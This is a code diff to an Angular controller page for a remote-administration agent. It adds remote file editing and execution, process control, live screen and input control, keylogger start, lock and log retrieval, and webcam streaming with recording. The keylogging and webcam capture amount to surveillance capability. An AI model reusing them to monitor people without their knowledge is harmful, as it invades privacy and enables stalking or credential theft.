@@ -1,13 +1,16 @@
 import { Component, signal, computed } from '@angular/core';
 import { ActivatedRoute } from '@angular/router';
 import { CommonModule, JsonPipe } from '@angular/common';
-
+import { FormsModule } from '@angular/forms';
 import { WebSocketService } from '../../services/websocket.service';
+import { ElementRef, ViewChild } from '@angular/core';
+import { effect } from '@angular/core';
+import { ExplorerEntry } from '../../services/websocket.service';
 
 @Component({
   selector: 'app-agent-detail',
   standalone: true,
-  imports: [CommonModule, JsonPipe],
+  imports: [CommonModule, JsonPipe, FormsModule],
   templateUrl: './agent-detail.html',
   styleUrls: ['./agent-detail.css']
 })
@@ -21,6 +24,41 @@ export class AgentDetailComponent {
   screenshot = computed(() => this.ws.screenshotUrl());
   webcamFrame = computed(() => this.ws.webcamFrameUrl());
 
+  // Explorer + Gallery
+  explorerItems = computed(() => this.ws.explorerItems());
+  currentExplorerPath = computed(() => this.ws.currentPath());
+  galleryItems = computed(() => this.ws.galleryItems());
+
+  // Remote control state
+  remoteActive = signal<boolean>(false);
+  private remoteIntervalId: any = null;
+  startExeName = "";
+  startExeArgs = "";
+  startAppName = "";
+  startAppArgs = "";
+  killAppName = "";
+  killExeName: string = "";
+  @ViewChild('webcamCanvas') webcamCanvas!: ElementRef<HTMLCanvasElement>;
+  private recorder: MediaRecorder | null = null;
+  private recordedChunks: Blob[] = [];
+  private recording = false;
+  isRecording = false;
+  mediaRecorder!: MediaRecorder;
+  private waitingFirstFrame = false;
+  private keyDownHandler = (e: KeyboardEvent) => this.onRemoteKeyDown(e);
+  private keyUpHandler = (e: KeyboardEvent) => this.onRemoteKeyUp(e);
+  editorOpen = signal(false);
+  editorPath = signal<string | null>(null);
+  editorContent = signal<string>('');
+  openEditorRequest(path: string) {
+  this.ws.sendJson({
+    module: "FILE",
+    command: "READ_TEXT",
+    payload: { path }
+  });
+}
+  killPid: number | null = null;
+
   rawJson = '';
   agent: any = null;
   loading = signal<boolean>(true);
@@ -28,7 +66,21 @@ export class AgentDetailComponent {
   constructor(
     public ws: WebSocketService,
     private route: ActivatedRoute
-  ) {}
+  ) {
+    effect(() => {
+    const url = this.ws.webcamFrameUrl();
+    if (!url) return;
+    this.handleWebcamFrame(url);
+  }); 
+  effect(() => {
+  const data = this.ws.editorContent();
+  if (!data) return;
+
+  // Khi server gửi READ_TEXT → mở editor
+  this.applyEditorContent(data.path, data.content);
+});
+
+  }
 
   ngOnInit() {
     this.route.paramMap.subscribe(params => {
@@ -38,9 +90,15 @@ export class AgentDetailComponent {
         return;
       }
 
-      // 📌 Fetch agent từ Registry server
       this.fetchAgent(id);
     });
+  }
+
+  ngOnDestroy() {
+    if (this.remoteIntervalId) {
+      clearInterval(this.remoteIntervalId);
+      this.remoteIntervalId = null;
+    }
   }
 
   // ================================
@@ -65,7 +123,6 @@ export class AgentDetailComponent {
   // ================================
   // WEBSOCKET
   // ================================
-
   connectWS() {
     if (!this.agent) return;
 
@@ -76,17 +133,24 @@ export class AgentDetailComponent {
   // ================================
   // MODULE UI
   // ================================
-
   backToModules() {
     this.selectedModule.set(null);
   }
 
   openModule(m: string) {
     this.selectedModule.set(m);
+
+    if (m === 'EXPLORER') {
+      // load root drives / folder list
+      this.ws.sendJson({ module: 'FILE', command: 'LIST_DIR', payload: { path: '' } });
+    } else if (m === 'GALLERY') {
+      // load media list
+      this.ws.sendJson({ module: 'FILE', command: 'LIST' });
+    }
   }
 
   // ================================
-  // RAW JSON
+  // RAW JSON (dev)
   // ================================
   sendRawJson() {
     try {
@@ -97,32 +161,62 @@ export class AgentDetailComponent {
     }
   }
 
+  // ================================
   // PROCESS
+  // ================================
   sendProcessList() {
     this.ws.sendJson({ module: "PROCESS", command: "LIST" });
   }
+  startProcess() {
+  if (!this.startExeName) return;
+
+  this.ws.sendJson({
+    module: "PROCESS",
+    command: "START",
+    payload: {
+      path: this.startExeName,
+      args: this.startExeArgs || ""
+    }
+  });
+}
+// killProcess(pid: number) {
+//   if (!pid) return;
+
+//   this.ws.sendJson({
+//     module: "PROCESS",
+//     command: "KILL",
+//     pid: Number(pid)
+//   });
+// }
+
 
   sendProcessKill() {
     const pid = prompt("Nhập PID cần kill:");
     if (pid) this.ws.sendJson({ module: "PROCESS", command: "KILL", pid: Number(pid) });
   }
 
-sendProcessStart() {
-  const exe = prompt("Nhập tên file .exe cần chạy:");
-  if (exe) this.ws.sendJson({
-    module: "PROCESS",
-    command: "START",
-    payload: { path: exe }
-  });
-}
-killProcess(pid: number) {
+  sendProcessStart() {
+    const exe = prompt("Nhập tên file .exe cần chạy:");
+    if (exe) this.ws.sendJson({
+      module: "PROCESS",
+      command: "START",
+      payload: { path: exe }
+    });
+  }
+
+  killProcess(pid: number | null) {
+  if (!pid) return; // null, 0, undefined đều không chạy
   this.ws.sendJson({
     module: "PROCESS",
     command: "KILL",
-    pid: pid
+    pid: Number(pid)
   });
 }
+
+
+  // ================================
   // SYSTEM
+  // ================================
   sendSystemShutdown() {
     this.ws.sendJson({ module: "SYSTEM", command: "SHUTDOWN" });
   }
@@ -139,7 +233,9 @@ killProcess(pid: number) {
     this.ws.sendJson({ module: "SYSTEM", command: "LOCK" });
   }
 
+  // ================================
   // SCREENSHOT
+  // ================================
   sendScreenCaptureBinary() {
     this.ws.sendJson({ module: "SCREEN", command: "CAPTURE_BINARY" });
   }
@@ -148,27 +244,67 @@ killProcess(pid: number) {
     this.ws.screenshotUrl.set(null);
   }
 
+  // ================================
   // APP
+  // ================================
   sendAppList() {
     this.ws.sendJson({ module: "APP", command: "LIST" });
   }
 
+  // sendAppStart() {
+  //   const name = prompt("Nhập app cần mở:");
+  //   if (name) this.ws.sendJson({
+  //     module: "APP",
+  //     command: "START",
+  //     payload: { path: name }
+  //   });
+  // }
   sendAppStart() {
-  const name = prompt("Nhập app cần mở:");
-  if (name) this.ws.sendJson({
+  if (!this.startExeName) return;
+
+  this.ws.sendJson({
     module: "APP",
     command: "START",
-    payload: { path: name }
+    payload: { path: this.startExeName }
   });
+
+  this.startExeName = "";
 }
-killApp(name: string) {
+
+
+killAppAll(exe: string) {
+  if (!exe) return;
+
   this.ws.sendJson({
     module: "APP",
     command: "KILL",
-    payload: { name: name }
+    payload: { name: exe }
   });
 }
+
+  // killApp(name: string) {
+  //   this.ws.sendJson({
+  //     module: "APP",
+  //     command: "KILL",
+  //     payload: { name: name }
+  //   });
+  // }
+ killApp(name: string | null) {
+  if (!name) return;
+
+  this.ws.sendJson({
+    module: "APP",
+    command: "KILL",
+    payload: { name }
+  });
+
+  this.killExeName = "";
+}
+
+
+  // ================================
   // KEYLOGGER
+  // ================================
   sendKeyloggerStart() {
     this.ws.sendJson({ module: "KEYBOARD", command: "START" });
   }
@@ -180,22 +316,493 @@ killApp(name: string) {
   sendKeyloggerGetLog() {
     this.ws.sendJson({ module: "KEYBOARD", command: "GET_LOG" });
   }
-clearKeylogs() {
-  this.ws.keylogList.set([]);  // Xóa toàn bộ log trong signal
+
+  clearKeylogs() {
+    this.ws.keylogList.set([]);
+  }
+//   get keylogText(): string {
+//   const list = this.ws.keylogList();
+
+//   if (!list || !Array.isArray(list)) return "";
+
+//   return list
+//     .map(entry => entry?.text ?? "")
+//     .join("");
+// }
+get keylogText(): string {
+  const list = this.ws.keylogList();
+  if (!list || !Array.isArray(list)) return "";
+
+  return list
+    .map(entry => entry?.text ?? "")
+    .filter(t => t !== "[BACKSPACE]")   // ⬅ BỎ HOÀN TOÀN CHUỖI BACKSPACE
+    .join("");
 }
-keylogString = computed(() => {
-  return this.keylogEntries().map(k => k.text).join("");
-});
 
+  // Lock / Unlock keyboard (mới thêm)
+  sendKeyloggerLock() {
+    this.ws.sendJson({ module: "KEYBOARD", command: "LOCK" });
+  }
 
+  sendKeyloggerUnlock() {
+    this.ws.sendJson({ module: "KEYBOARD", command: "UNLOCK" });
+  }
 
+  keylogString = computed(() => {
+    return this.keylogEntries().map(k => k.text).join("");
+  });
 
+  // ================================
   // WEBCAM
-  sendWebcamStartStream() {
+  // ================================
+  // sendWebcamStartStream() {
+  //   this.ws.sendJson({ module: "WEBCAM", command: "START_STREAM" });
+  // }
+
+  // // Stop & Save (mới sửa)
+  // sendWebcamStopStream() {
+  //   this.ws.sendJson({
+  //     module: "WEBCAM",
+  //     command: "STOP_STREAM",
+  //     payload: { save: true }
+  //   });
+  // }
+
+    sendWebcamStartStream() {
     this.ws.sendJson({ module: "WEBCAM", command: "START_STREAM" });
+     this.waitingFirstFrame = true;
+
+  // Setup recorder
+  const canvas = this.webcamCanvas.nativeElement;
+  const stream = canvas.captureStream(25);
+
+  this.recordedChunks = [];
+  this.mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
+
+  this.mediaRecorder.ondataavailable = e => {
+    if (e.data.size > 0) this.recordedChunks.push(e.data);
+  };
+
+  this.mediaRecorder.onstop = () => {
+    const blob = new Blob(this.recordedChunks, { type: 'video/webm' });
+    const reader = new FileReader();
+    reader.onloadend = () => {
+      const base64 = (reader.result as string).split(',')[1];
+      this.ws.sendJson({
+        module: 'FILE',
+        command: 'SAVE_VIDEO',
+        payload: {
+          name: `cam_${Date.now()}.webm`,
+          data: base64
+        }
+      });
+    };
+    reader.readAsDataURL(blob);
+  };
+
+
   }
 
   sendWebcamStopStream() {
-    this.ws.sendJson({ module: "WEBCAM", command: "STOP_STREAM" });
+   this.ws.sendJson({ module: "WEBCAM", command: "STOP_STREAM" });
+
+  if (this.isRecording && this.mediaRecorder) {
+    this.mediaRecorder.stop();
   }
+
+  this.isRecording = false;
+  }
+
+  private saveVideoToServer() {
+    const blob = new Blob(this.recordedChunks, { type: "video/webm" });
+
+    const reader = new FileReader();
+    reader.onloadend = () => {
+      const base64 = reader.result!.toString().split(",")[1];
+
+      this.ws.sendJson({
+        module: "FILE",
+        command: "SAVE_VIDEO",
+        payload: {
+          name: `cam_${Date.now()}.webm`,
+          data: base64
+        }
+      });
+    };
+
+    reader.readAsDataURL(blob);
+  }
+
+  // Khi webcam frame cập nhật → vẽ vào canvas
+ngAfterViewInit() {
+ 
+  
+}
+private handleWebcamFrame(url: string) {
+  const img = new Image();
+  img.onload = () => {
+    const canvas = this.webcamCanvas.nativeElement;
+    const ctx = canvas.getContext("2d");
+    if (!ctx) return;
+
+    canvas.width = img.width;
+    canvas.height = img.height;
+    ctx.drawImage(img, 0, 0);
+
+    if (this.waitingFirstFrame) {
+      this.waitingFirstFrame = false;
+
+      this.recordedChunks = [];
+      const stream = canvas.captureStream(25);
+      this.mediaRecorder = new MediaRecorder(stream);
+
+      this.mediaRecorder.ondataavailable = (e) => {
+        if (e.data.size > 0) this.recordedChunks.push(e.data);
+      };
+
+      this.mediaRecorder.onstop = () => this.saveVideoToServer();
+
+      this.mediaRecorder.start();
+      this.isRecording = true;
+    }
+
+    if (this.isRecording) ctx.drawImage(img, 0, 0);
+  };
+
+  img.src = url;
+}
+
+
+  // ================================
+  // EXPLORER
+  // ================================
+  explorerGoRoot() {
+    this.ws.sendJson({ module: 'FILE', command: 'LIST_DIR', payload: { path: '' } });
+  }
+
+  explorerRefresh() {
+    const path = this.currentExplorerPath() || '';
+    this.ws.sendJson({ module: 'FILE', command: 'LIST_DIR', payload: { path } });
+  }
+
+  explorerOpen(item: any) {
+    if (item.type === 'drive' || item.type === 'dir') {
+      this.ws.sendJson({
+        module: 'FILE',
+        command: 'LIST_DIR',
+        payload: { path: item.path }
+      });
+    } else {
+      // file thường → EXECUTE (cho đơn giản)
+      this.ws.sendJson({
+        module: 'FILE',
+        command: 'EXECUTE',
+        payload: { path: item.path }
+      });
+    }
+  }
+  getExplorerIcon(item: any): string {
+  if (!item || !item.type) return "📄";
+
+  const t = item.type.toLowerCase();
+
+  if (t === "drive") return "💽";
+  if (t === "dir" || t === "folder") return "📁";
+  if (t === 'image') return '🖼️';
+
+  // file khác
+  return "📄";
+}
+explorerBack() {
+  let path = this.currentExplorerPath();
+
+  if (!path || path === "" || path === "ROOT") {
+    // đang ở ROOT -> không back nữa
+    this.explorerGoRoot();
+    return;
+  }
+
+  // Chuẩn hoá slash cho chắc
+  path = path.replace(/\//g, "\\");
+
+  // Nếu đang ở ổ đĩa: D:\  C:\
+  if (/^[A-Z]:\\?$/i.test(path)) {
+    this.explorerGoRoot();
+    return;
+  }
+
+  // Tìm thư mục cha
+  const idx = path.lastIndexOf("\\");
+  if (idx <= 2) {
+    // VD: D:\Folder → idx=2 → quay về D:\
+    const drive = path.substring(0, 3);
+    this.ws.sendJson({
+      module: "FILE",
+      command: "LIST_DIR",
+      payload: { path: drive }
+    });
+    return;
+  }
+
+  // Thu được thư mục cha
+  const parent = path.substring(0, idx);
+
+  this.ws.sendJson({
+    module: "FILE",
+    command: "LIST_DIR",
+    payload: { path: parent }
+  });
+  
+}
+// openFile(item: ExplorerEntry) {
+//   if (item.type === 'file' || item.name.endsWith('.txt') || item.name.endsWith('.log')) {
+//     this.openEditorRequest(item.path);
+//   }
+// }
+openFile(item: ExplorerEntry) {
+  const name = (item.name || '').toLowerCase();
+  if (name.endsWith('.txt') || name.endsWith('.log') || name.endsWith('.json') || name.endsWith('.js') ) {
+    this.openEditorRequest(item.path);
+    return;
+  }
+  // fallback: thực thi file trên remote (giống trước)
+  this.ws.sendJson({ module: 'FILE', command: 'EXECUTE', payload: { path: item.path } });
+}
+onExplorerItemDblClick(item: any) {
+  if (!item) return;
+
+  const type = (item.type || "").toLowerCase();
+
+  // Nếu là thư mục → navigate (LIST_DIR)
+  if (type === "drive" || type === "dir" || type === "folder") {
+    this.explorerOpen(item);
+    return;
+  }
+
+  // Nếu là file text → mở editor
+  if (item.name.toLowerCase().endsWith(".txt") ||
+      item.name.toLowerCase().endsWith(".log") ||
+      item.name.toLowerCase().endsWith(".ini") ||
+      item.name.toLowerCase().endsWith(".json")) {
+
+    this.openEditorRequest(item.path);  // Gửi READ_TEXT
+    return;
+  }
+
+  // Nếu file khác → EXECUTE (giống client)
+  this.ws.sendJson({
+    module: "FILE",
+    command: "EXECUTE",
+    payload: { path: item.path }
+  });
+}
+
+// GỌI KHI SERVER TRẢ FILE
+applyEditorContent(path: string, content: string) {
+  this.editorPath.set(path);
+  this.editorContent.set(content);
+  this.editorOpen.set(true);
+}
+
+// USER GÕ TRONG TEXTAREA
+updateEditorText(evt: Event) {
+  const v = (evt.target as HTMLTextAreaElement).value;
+  this.editorContent.set(v);
+}
+
+// SAVE FILE VỀ SERVER
+saveEditorFile() {
+  if (!this.editorPath()) return;
+
+  this.ws.sendJson({
+    module: "FILE",
+    command: "WRITE_TEXT",
+    payload: {
+      path: this.editorPath(),
+      content: this.editorContent()
+    }
+  });
+
+  // Đóng editor sau khi gửi (hoặc bạn chờ server confirm cũng được)
+  this.editorOpen.set(false);
+}
+
+// ĐÓNG EDITOR
+closeEditor() {
+  this.editorOpen.set(false);
+  this.editorPath.set(null);
+  this.editorContent.set('');
+}
+
+
+  // ================================
+  // GALLERY
+  // ================================
+  isImage(name: string) {
+  return name.endsWith(".jpg") || name.endsWith(".jpeg") || name.endsWith(".png");
+}
+
+isVideo(name: string) {
+  return name.endsWith(".webm") || name.endsWith(".mp4");
+}
+
+  reloadGallery() {
+    this.ws.sendJson({ module: 'FILE', command: 'LIST' });
+  }
+
+  // openGalleryItem(item: any) {
+  //   console.log('Open gallery item:', item);
+  //   // tuỳ backend: bạn có thể gửi thêm lệnh GET media ở đây
+  //}
+
+  openGalleryItem(item: any) {
+    this.ws.viewingFile.set(item);
+
+    this.ws.sendJson({
+      module: "FILE",
+      command: "GET",
+      payload: { name: item.name }
+    });
+  }
+
+  // ================================
+  // REMOTE CONTROL
+  // ================================
+  private getRelativeCoords(evt: MouseEvent): { x: number; y: number } | null {
+    const target = evt.target as HTMLElement;
+    if (!target) return null;
+    const rect = target.getBoundingClientRect();
+    const x = (evt.clientX - rect.left) / rect.width;
+    const y = (evt.clientY - rect.top) / rect.height;
+    if (x < 0 || x > 1 || y < 0 || y > 1) return null;
+    return { x, y };
+  }
+
+  toggleRemote() {
+    const next = !this.remoteActive();
+    this.remoteActive.set(next);
+
+    if (next) {
+      // === GẮN KEYBOARD EVENT ===
+    window.addEventListener('keydown', this.keyDownHandler);
+    window.addEventListener('keyup', this.keyUpHandler);
+      // start loop CAPTURE_BINARY (remote)
+      this.ws.sendJson({
+        module: 'SCREEN',
+        command: 'CAPTURE_BINARY',
+        payload: { save: false }
+      });
+
+      this.remoteIntervalId = setInterval(() => {
+        if (!this.remoteActive()) return;
+        this.ws.sendJson({
+          module: 'SCREEN',
+          command: 'CAPTURE_BINARY',
+          payload: { save: false }
+        });
+      }, 80); // ~12 FPS, tuỳ bạn chỉnh
+    } else {
+      if (this.remoteIntervalId) {
+        clearInterval(this.remoteIntervalId);
+        this.remoteIntervalId = null;
+         // === GỠ KEYBOARD EVENT ===
+        window.removeEventListener('keydown', this.keyDownHandler);
+        window.removeEventListener('keyup', this.keyUpHandler);
+      }
+    }
+  }
+
+  onRemoteMouseMove(evt: MouseEvent) {
+    if (!this.remoteActive()) return;
+    const pos = this.getRelativeCoords(evt);
+    if (!pos) return;
+
+    this.ws.sendJson({
+      module: 'INPUT',
+      command: 'MOUSE_MOVE',
+      payload: { x: pos.x, y: pos.y }
+    });
+  }
+
+  onRemoteMouseDown(evt: MouseEvent) {
+    if (!this.remoteActive()) return;
+    const pos = this.getRelativeCoords(evt);
+    if (!pos) return;
+
+    const btn = evt.button === 0 ? 'left' : evt.button === 1 ? 'middle' : 'right';
+
+    this.ws.sendJson({
+      module: 'INPUT',
+      command: 'MOUSE_BTN',
+      payload: { x: pos.x, y: pos.y, type: 'down', btn }
+    });
+  }
+
+  onRemoteMouseUp(evt: MouseEvent) {
+    if (!this.remoteActive()) return;
+    const pos = this.getRelativeCoords(evt);
+    if (!pos) return;
+
+    const btn = evt.button === 0 ? 'left' : evt.button === 1 ? 'middle' : 'right';
+
+    this.ws.sendJson({
+      module: 'INPUT',
+      command: 'MOUSE_BTN',
+      payload: { x: pos.x, y: pos.y, type: 'up', btn }
+    });
+  }
+
+  onRemoteWheel(evt: WheelEvent) {
+    if (!this.remoteActive()) return;
+    evt.preventDefault();
+
+    const delta = evt.deltaY > 0 ? -120 : 120;
+    this.ws.sendJson({
+      module: 'INPUT',
+      command: 'MOUSE_WHEEL',
+      payload: { delta }
+    });
+  }
+  onRemoteKeyDown(evt: KeyboardEvent) {
+  if (!this.remoteActive()) return;
+
+  evt.preventDefault();
+  this.ws.sendJson({
+    module: 'INPUT',
+    command: 'KEY_EVENT',
+    payload: { key: evt.keyCode, type: 'down' }
+  });
+}
+
+onRemoteKeyUp(evt: KeyboardEvent) {
+  if (!this.remoteActive()) return;
+
+  evt.preventDefault();
+  this.ws.sendJson({
+    module: 'INPUT',
+    command: 'KEY_EVENT',
+    payload: { key: evt.keyCode, type: 'up' }
+  });
+}
+onRemoteContextMenu(evt: MouseEvent) {
+  evt.preventDefault(); // CHẶN menu Chrome
+  if (!this.remoteActive()) return;
+
+  const pos = this.getRelativeCoords(evt);
+  if (!pos) return;
+
+  this.ws.sendJson({
+    module: 'INPUT',
+    command: 'MOUSE_BTN',
+    payload: { x: pos.x, y: pos.y, type: 'down', btn: 'right' }
+  });
+
+  // Optional: gửi UP luôn để thành 1 click
+  this.ws.sendJson({
+    module: 'INPUT',
+    command: 'MOUSE_BTN',
+    payload: { x: pos.x, y: pos.y, type: 'up', btn: 'right' }
+  });
+}
+  
 }
